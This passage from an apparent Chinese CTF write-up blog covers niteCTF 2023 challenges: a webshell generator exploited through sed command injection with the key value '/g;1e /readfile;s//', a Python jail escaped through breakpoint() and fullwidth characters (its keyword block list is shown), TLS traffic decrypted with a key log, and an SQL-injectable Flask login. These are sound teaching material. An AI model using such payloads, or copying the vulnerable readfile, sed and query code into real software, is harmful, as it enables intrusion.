            <span class="token property">background-color</span><span class="token punctuation">:</span> #3e8e41<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Webshell生成器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshell语言：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请求方法：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>POST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>REQUEST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>REQUEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密钥：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>114<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[A-Za-z0-9]+<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>你的key太复杂了！简单点！o.O<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshell文件名称：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>webshell.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>生成你的专属Webshell！<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>download.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename=<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>generate.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>

<span class="token builtin class-name">set</span> <span class="token parameter variable">-e</span>

<span class="token assign-left variable">NEW_FILENAME</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">tr</span> <span class="token parameter variable">-dc</span> a-z0-9 <span class="token operator">&lt;</span>/dev/urandom <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">16</span><span class="token variable">)</span></span>
<span class="token function">cp</span> template.php <span class="token string">"/tmp/<span class="token variable">$NEW_FILENAME</span>"</span>
<span class="token builtin class-name">cd</span> /tmp

<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/KEY/<span class="token variable">$KEY</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span>
<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/METHOD/<span class="token variable">$METHOD</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span>

realpath <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个文件看出<code>$KEY</code>和<code>$METHOD</code>参数可控，那么可以利用这里来得到flag。<br>这里将其提前闭合，可将<code>$KEY</code>赋值为<code>/g</code>，然后e参数可以执行命令<br><code>sed -i &quot;s/KEY//g;1e /readfile;//&quot; &quot;$NEW_FILENAME&quot;</code><br><code>s/KEY//g;</code>会把KEY置空，将上面的命令进行闭合即可<br><code>sed -i &quot;s/KEY//g;1e /readfile;s//&quot; &quot;$NEW_FILENAME&quot;</code><br>那么key只需传入<code>/g;1e /readfile;s//</code><br><img src="https://img-blog.csdnimg.cn/direct/b3bfc0ece8bd4f82957c6e4b4a362870.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2bb8f44e6b6d4d2a8b5b6c35bdc0612c.png" alt="456"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>niteCTF-2023-MISC</title>
    <url>/2023/12/21/niteCTF-2023-MISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="blindjail"><a href="#blindjail" class="headerlink" title="blindjail"></a>blindjail</h2><p>nc连接题目，也没有源码<br><img src="https://img-blog.csdnimg.cn/direct/965af19a6dbf4a0eaa03b21e89043b44.png" alt="123"><br>看起来像是python终端，要进行命令执行时发现import被禁了<br>在这里了解到python中的一个函数<strong>breakpoint()</strong><br><img src="https://img-blog.csdnimg.cn/direct/c3de4eefccdd4c1f9af07b920b7b4f41.png" alt="12"><br>那么这里就使用这个函数尝试一下<br><img src="https://img-blog.csdnimg.cn/direct/ee933b91579b454590e5e63f8cd88dba.png" alt="456"><br>当然还可以使用全角字符绕过<br><img src="https://img-blog.csdnimg.cn/direct/c6cc0ea01d334648b1f6e1eeeef9801b.png" alt="132"></p>
<p>趁机偷一下源码😁</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># main.py</span>
<span class="token comment"># print(getattr("".__class__.___mro___.__subclasses__()[108])().load_module("\x6f\x73"),"")</span>
<span class="token comment"># subclasses = "".__class__.__mro__[1].__subclasses__()</span>
<span class="token comment"># print("Subclasses:", subclasses)</span>


<span class="token keyword">def</span> <span class="token function">checker</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># a = inp  # f'flag'+ inp</span>
    <span class="token comment"># print(a)</span>
    <span class="token comment"># redact the keyword lists</span>

    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> <span class="token punctuation">[</span>
        <span class="token string">"eval"</span><span class="token punctuation">,</span>
        <span class="token string">"exec"</span><span class="token punctuation">,</span>
        <span class="token string">"import"</span><span class="token punctuation">,</span>
        <span class="token string">"open"</span><span class="token punctuation">,</span>
        <span class="token string">"os"</span><span class="token punctuation">,</span>
        <span class="token string">"read"</span><span class="token punctuation">,</span>
        <span class="token string">"system"</span><span class="token punctuation">,</span>
        <span class="token string">"write"</span><span class="token punctuation">,</span>
        <span class="token string">"subprocess"</span><span class="token punctuation">,</span>
        <span class="token string">"str"</span><span class="token punctuation">,</span>
        <span class="token string">"flag"</span><span class="token punctuation">,</span>
        <span class="token string">"import"</span><span class="token punctuation">,</span>
        <span class="token string">"cat"</span><span class="token punctuation">,</span>
        <span class="token string">"63"</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" Nope,  </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">  is banned! "</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        o <span class="token operator">=</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> o <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>
    <span class="token string">"------------------------------------------------------------- \n WELCOME TO THE BLINDJAIL \n --------------------------------------------------------\n "</span>
    <span class="token string">"\x1B[3m fret not that you cannot see, fret that you cannot leave.\x1B[0m "</span>
<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> inp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        checker<span class="token punctuation">(</span>inp<span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"look for the light! \n"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="DecryptaQuest"><a href="#DecryptaQuest" class="headerlink" title="DecryptaQuest"></a>DecryptaQuest</h2><p>给了一个流量包<a href="https://github.com/daffainfo/ctf-writeup/blob/main/niteCTF%202023/DecryptaQuest/Decryta_logs.pcapng">Decryta_logs.pcapng</a><br>存在一些未解密的tls流量包，打开之后经过一番查找找到一段base64密文，使用cyber解码一下<br><img src="https://img-blog.csdnimg.cn/direct/0af975aab3d548998d6ee631e4854276.png" alt="123"><br>通过一下内容看出是SSLKEYLOGFILE</p>
<blockquote>
<p>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_TRAFFIC_SECRET_0<br>SERVER_TRAFFIC_SECRET_0<br>EXPORTER_SECRET<br><img src="https://img-blog.csdnimg.cn/direct/b24592424660498e96c923ee6ab0120e.png" alt="456"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/afe378d07d7f4d5692ff45e0e646402c.png" alt="456"><br>现在将SSLKEYLOGFILE导出保存然后再导入到wireshark中<br>编辑-&gt;首选项-&gt;Protocols-&gt;TLS<br><img src="https://img-blog.csdnimg.cn/direct/c20137bdfbd64513bdda2b913e922398.png" alt="123"><br>然后过滤http流量<br><img src="https://img-blog.csdnimg.cn/direct/a613499b2c0c48a99f2e92576ab0920d.png" alt="132"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>niteCTF-2023-Image-Gallery-wirteup</title>
    <url>/2023/12/20/niteCTF-2023-Image-Gallery-wirteup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>SQL注入绕过，js反混淆</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目给了源代码如下<br><strong>main.py</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session
<span class="token keyword">import</span> sqlite3
<span class="token keyword">import</span> uuid

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">"="</span><span class="token punctuation">,</span>
            <span class="token string">"&lt;"</span><span class="token punctuation">,</span>
            <span class="token string">">"</span><span class="token punctuation">,</span>
            <span class="token string">"+"</span><span class="token punctuation">,</span>
            <span class="token string">"//"</span><span class="token punctuation">,</span>
            <span class="token string">"|"</span><span class="token punctuation">,</span>
            <span class="token string">";"</span><span class="token punctuation">,</span>
            <span class="token string">" "</span><span class="token punctuation">,</span>
            <span class="token string">" "</span><span class="token punctuation">,</span>
            <span class="token string">"'1"</span><span class="token punctuation">,</span>
            <span class="token string">" 1"</span><span class="token punctuation">,</span>
            <span class="token string">" true"</span><span class="token punctuation">,</span>
            <span class="token string">"'true"</span><span class="token punctuation">,</span>
            <span class="token string">" or"</span><span class="token punctuation">,</span>
            <span class="token string">"'or"</span><span class="token punctuation">,</span>
            <span class="token string">"/or"</span><span class="token punctuation">,</span>
            <span class="token string">" and"</span><span class="token punctuation">,</span>
            <span class="token string">"'and"</span><span class="token punctuation">,</span>
            <span class="token string">"/and"</span><span class="token punctuation">,</span>
            <span class="token string">"'like"</span><span class="token punctuation">,</span>
            <span class="token string">" like"</span><span class="token punctuation">,</span>
            <span class="token string">"/like"</span><span class="token punctuation">,</span>
            <span class="token string">"'where"</span><span class="token punctuation">,</span>
            <span class="token string">" where"</span><span class="token punctuation">,</span>
            <span class="token string">"/where"</span><span class="token punctuation">,</span>
            <span class="token string">"%00"</span><span class="token punctuation">,</span>
            <span class="token string">"null"</span><span class="token punctuation">,</span>
            <span class="token string">"admin'"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
        matching_value <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span>
                value
                <span class="token keyword">for</span> value <span class="token keyword">in</span> invalid_entries
                <span class="token keyword">if</span> value <span class="token keyword">in</span> loweruser <span class="token keyword">or</span> value <span class="token keyword">in</span> lowerpass
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token boolean">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> matching_value<span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token punctuation">(</span>
                <span class="token string-interpolation"><span class="token string">f"Invalid entry in username and/or password fields. Please try again."</span></span>
            <span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>

        conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"chal.db"</span><span class="token punctuation">)</span>
        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

        query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT secret FROM login_details WHERE username = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">' AND password = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">';"</span></span>

        result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">)</span>
        user <span class="token operator">=</span> result<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>

        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> user<span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
            session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
            session<span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"profile"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
